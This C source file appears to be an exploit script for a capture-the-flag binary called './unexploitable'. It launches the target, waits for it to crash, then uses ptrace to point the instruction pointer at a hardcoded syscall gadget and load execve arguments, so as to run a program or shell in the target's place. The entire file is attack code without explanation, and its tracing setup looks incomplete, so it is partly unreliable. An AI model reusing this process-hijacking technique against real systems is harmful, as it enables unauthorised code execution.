#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#define SYSCALL_GADGET 0x400560
#define FILENAME_ADDRESS 0x400260

pid_t run_child(int *stdin)
{
    pid_t child = fork();

    if (!child)
    {
        execl("./unexploitable", "./unexploitable", NULL);
    }

    return child;
}

void exec_shell(pid_t child)
{
    struct user_regs_struct modified_regs;

    ptrace(PTRACE_GETREGS, child, NULL, &modified_regs);

    modified_regs.rip = SYSCALL_GADGET;
    modified_regs.rax = SYS_execve;
    modified_regs.rdi = FILENAME_ADDRESS; // GNU
    modified_regs.rsi = modified_regs.rdx = 0;

    ptrace(PTRACE_SETREGS, child, NULL, &modified_regs);

    ptrace(PTRACE_DETACH, child, NULL, NULL);
}

int main()
{
    int subprocess_stdin;
    pid_t child = run_child(&subprocess_stdin);
    if (child == -1)
    {
        puts("unable to execute child!");
        return 1;
    }

    int status;
    pid_t child_pid = wait(&status);

    if (!WIFSTOPPED(status) || WSTOPSIG(status) != SIGSEGV)
    {
        printf("weird return... %d\n", status);
        return 2;
    }

    exec_shell(child_pid);

    sleep(-1); // sleep forever

    return 0;
}